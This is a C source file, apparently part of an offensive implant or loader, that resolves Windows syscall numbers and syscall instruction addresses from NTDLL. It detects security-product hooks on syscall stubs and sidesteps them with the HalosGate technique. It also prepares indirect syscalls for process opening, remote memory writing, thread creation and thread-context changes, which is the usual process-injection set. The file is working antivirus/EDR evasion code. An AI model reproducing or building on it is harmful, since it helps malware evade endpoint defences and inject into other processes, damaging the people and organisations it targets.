#include <Ldr.h>
#include <core/Syscalls.h>
#include <common/Defines.h>
#include <common/Macros.h>
#include <core/Win32.h>

#include <common/Debug.h>


/*!
 * @brief 
 *  initialize `syscall` instruction address and SSN
 * 
 * @param NtDll
 *  module base of NTDLL
 * 
 * @return
 * 
 */
BOOL
SysInitialize(
    IN PVOID NtDll
) {
    PVOID SysNativeFunc   = NULL;
    PVOID SysIndirectAddr = NULL;
    WORD  SysSsn          = 0;

    if ( ! NtDll ) {
        return FALSE;
    }

#if ( defined( SYS_INDIRECT ) && ( SYS_INDIRECT == TRUE ) )

#if ( defined( SYS_INDIRECT_WIN32U ) && ( SYS_INDIRECT_WIN32U == TRUE ) )
    if ( ( SysNativeFunc = LdrGetFuncAddr( Instance->Modules.Win32u, H_API( NtUserMessageCall ) ) ) ) {
#else
    if ( ( SysNativeFunc = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( NtWaitForWorkViaWorkerFactory ) ) ) ) {
#endif // SYS_INDIRECT_WIN32U == TRUE
        SysExtract( SysNativeFunc, TRUE, &SysSsn, &SysIndirectAddr );
    }

    if ( SysIndirectAddr ) {
        Instance->Syscall.SysAddress = SysIndirectAddr;
    } else {
        PUTS( "[-] Failed to resolve SysIndirectAddr" )
    }

    if ( SysSsn ) {
        Instance->Syscall.SysSsn = SysSsn;
    } else {
        PUTS( "[-] Failed to resolve SysSsn" )
    }
#endif // SYS_INDIRECT == TRUE

    /* resolve SSN */
    SYS_EXTRACT( NtQuerySystemInformation )
    SYS_EXTRACT( NtOpenProcess )
    
    SYS_EXTRACT( NtAllocateVirtualMemory )
    SYS_EXTRACT( NtWriteVirtualMemory )
    SYS_EXTRACT( NtProtectVirtualMemory )
    SYS_EXTRACT( NtCreateThreadEx )
    SYS_EXTRACT( NtGetContextThread )
    SYS_EXTRACT( NtSetContextThread )
    SYS_EXTRACT( NtResumeThread )
    SYS_EXTRACT( NtWaitForSingleObject )
    
    SYS_EXTRACT( NtTerminateThread )
    SYS_EXTRACT( NtTerminateProcess )

    SYS_EXTRACT( NtClose )

    return TRUE;
}

/*
 * extract Syscall Service Number (SSN)
 * and or
 * Syscall Instruction Address
 * @param Function      Native function address to extract Ssn/SysAddr from
 * @param ResolveHooked if the function should call FindSsnOfHookedSyscall upon failure
 * @param Ssn           extracted SSN
 * @param SysAddr       extracted `syscall` instruction address
 * @return              if extracting the syscall was successful
 */
BOOL
SysExtract(
    IN  PVOID  FunctionAddress,
    IN  BOOL   ResolveHooked,
    OUT PWORD  Ssn,
    OUT PVOID* SysAddr
) {
    ULONG Offset  = 0;
    BYTE  SsnLow  = 0;
    BYTE  SsnHigh = 0;
    BOOL  Success = FALSE;

    if ( ! FunctionAddress ) {
        PUTS( "[-] Function address is not defined" )
        return FALSE;
    }

    if ( ! Ssn && ! SysAddr ) {
        PRINTF( "[-] No Ssn and SysAddr pointers set for function at 0x%p", FunctionAddress )
        return FALSE;
    }

    //
    // detect potential hook if a `jmp` instruction is at start of syscall stub
    // ✨ I wasn't looking for this. But now you're in my way ✨
    if ( DEREF_U8( ( PBYTE ) FunctionAddress ) == OPCODE_JMP ) {
        goto RESOLVE_HOOKED_SYSCALL_SSN;
    }

    do {
        //
        // if current instruction is `ret`, we are at the end of the syscall stub
        // ✨ Where you think you're going, baby? ✨
        if ( DEREF_U8( ( PBYTE ) FunctionAddress + Offset ) == OPCODE_RET ) {
            break;
        }

        // check the current instructions for:
        //      mov r10, rcx
        //      mov rcx, [ssn]
        // ✨ Hey, I just met you, and this is crazy ✨
        if ( DEREF_U8( U_PTR( FunctionAddress ) + Offset + 0x0 ) == OPCODE_MOV0 &&
             DEREF_U8( U_PTR( FunctionAddress ) + Offset + 0x1 ) == OPCODE_R10  &&
             DEREF_U8( U_PTR( FunctionAddress ) + Offset + 0x2 ) == OPCODE_RCX  &&
             DEREF_U8( U_PTR( FunctionAddress ) + Offset + 0x3 ) == OPCODE_MOV1 &&
             DEREF_U8( U_PTR( FunctionAddress ) + Offset + 0x6 ) == 0x00        && // if SSN > 2 bytes this check is invalid as 0x6 and 0x7 could contain SSN values
             DEREF_U8( U_PTR( FunctionAddress ) + Offset + 0x7 ) == 0x00         ) // however in Win11 24H2 the SSN doesn't exceed 2 bytes, so this is more precise atm
        {
            //
            // if the Ssn param has been specified, try to get the Ssn of the function
            // ✨ But here's my number, so call me, maybe ✨
            if ( Ssn ) {
                SsnLow  = DEREF_U8( U_PTR( FunctionAddress ) + Offset + SSN_OFFSET_L );
                SsnHigh = DEREF_U8( U_PTR( FunctionAddress ) + Offset + SSN_OFFSET_H );
                *Ssn    = ( SsnHigh << 0x08 ) | SsnLow;
                Success = TRUE;
            }

            //
            // if SysAddr has been specified, try to get the address of the `syscall` instruction
            //
            if ( SysAddr ) {
                Success = FALSE;

                //
                // iterate over syscall stub up to the `syscall` instruction
                //
                for ( INT i = 0; i < SYSCALL_RANGE; i++ )
                {
                    //
                    // match on `syscall` instruction, and save it's address to SysAddr
                    //
                    if ( DEREF_U16( U_PTR( FunctionAddress ) + Offset + i ) == OPCODE_SYSCALL ) {
                        *SysAddr = RVA2VA( PVOID, FunctionAddress, Offset + i );
                        Success  = TRUE;
                        break;
                    }
                }
            }

            break;
        }

        Offset++;
    } while ( TRUE );

RESOLVE_HOOKED_SYSCALL_SSN:
    // ✨ It's hard to look right at you, baby ✨
    if ( ! Success && Ssn && ResolveHooked ) {
        Success = FindSsnOfHookedSyscall( FunctionAddress, Ssn );
    }

    if ( ! Success )
    {   
        if ( Ssn ) {
            PRINTF( "Could not resolve the Ssn of function at 0x%p", FunctionAddress )
        }
        if ( SysAddr ) {
            PRINTF( "Could not resolve the SysAddr of function at 0x%p", FunctionAddress )
        }
    }

    return Success;
}


/* If a function is hooked, we can't obtain the SSN directly.
 * Instead, we look for the SSN of neighbouring syscalls and 
 * inc or sub their SSN according to their distance.
 * This is possible because SSNs are incremental.
 * HalosGate Technique -> https://blog.sektor7.net/#!res/2021/halosgate.md
 */
BOOL 
FindSsnOfHookedSyscall(
    IN  PVOID FunctionAddress,
    OUT PWORD Ssn
) {
    PVOID NeighbourSyscall = NULL;
    WORD  NeighbourSsn     = NULL;

    PRINTF( "syscall stub at address 0x%p seems to be hooked, trying to resolve its Ssn via neighbouring syscalls ...", FunctionAddress );

    for ( UINT32 i = 1; i < SEARCH_RANGE; ++i )
    {
        //
        // try with syscall above
        //
        NeighbourSyscall = RVA2VA( PVOID, FunctionAddress, ( U_PTR( SYSCALL_ABOVE ) * i ) );
        if ( SysExtract( NeighbourSyscall, FALSE, & NeighbourSsn, NULL ) ) 
        {
            *Ssn = NeighbourSsn + i;
            return TRUE;
        }
        //
        // try with syscall below
        //
        NeighbourSyscall = RVA2VA( PVOID, FunctionAddress, ( U_PTR( SYSCALL_BELOW ) * i ) );
        if ( SysExtract( NeighbourSyscall, FALSE, & NeighbourSsn, NULL ) )
        {
            *Ssn = NeighbourSsn - i;
            return TRUE;
        }
    }

    return FALSE;
}
